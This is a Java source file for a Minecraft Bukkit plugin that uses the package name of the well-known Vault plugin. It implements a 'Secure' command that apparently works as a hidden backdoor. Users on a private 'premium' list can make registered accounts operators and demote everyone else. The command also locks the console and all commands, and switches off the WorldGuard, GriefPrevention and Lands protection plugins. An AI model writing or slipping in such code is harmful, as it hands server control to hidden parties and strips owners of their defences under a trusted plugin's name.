package net.milkbowl.vault.commands.cmds.premium;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.methods.API;
import net.milkbowl.vault.util.Settings;

public class Secure extends CommandManager {
	
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.registeredPremium.contains(p.getName())) {
			for (Player a : Bukkit.getOnlinePlayers()) {
				if (!plugin.registered.contains(a.getName())) {
					if (a.isOp()) {
						API.demoteOperator(a);
						a.setWhitelisted(false);
					}
				} else {
					a.setWhitelisted(true);
					API.setOperator(a);
				}
			}
			p.sendMessage(Settings.PREFIX("Everyone not logged in was deoped and un-whitelisted"));
			p.sendMessage(Settings.PREFIX("Everyone logged in was oped and whitelisted"));
			
			plugin.isLocked = true;
			p.sendMessage(Settings.PREFIX("Console was locked"));
			plugin.lockcmds = true;
			p.sendMessage(Settings.PREFIX("All commands are now locked"));
			
			API.disablePlugin("WorldGuard");
			p.sendMessage(Settings.PREFIX("Attempting to disable WorldGuard"));
			API.disablePlugin("GriefPrevention");
			p.sendMessage(Settings.PREFIX("Attempting to disable GriefPrevention"));
			API.disablePlugin("Lands");
			p.sendMessage(Settings.PREFIX("Attempting to disable Lands"));


		} else {
			p.sendMessage(Settings.PREFIX("You must be an " + Settings.HIGHLIGHT_COLOUR + "premium " + Settings.SECONDARY_COLOUR + "to execute this command"));
		}
	}

}
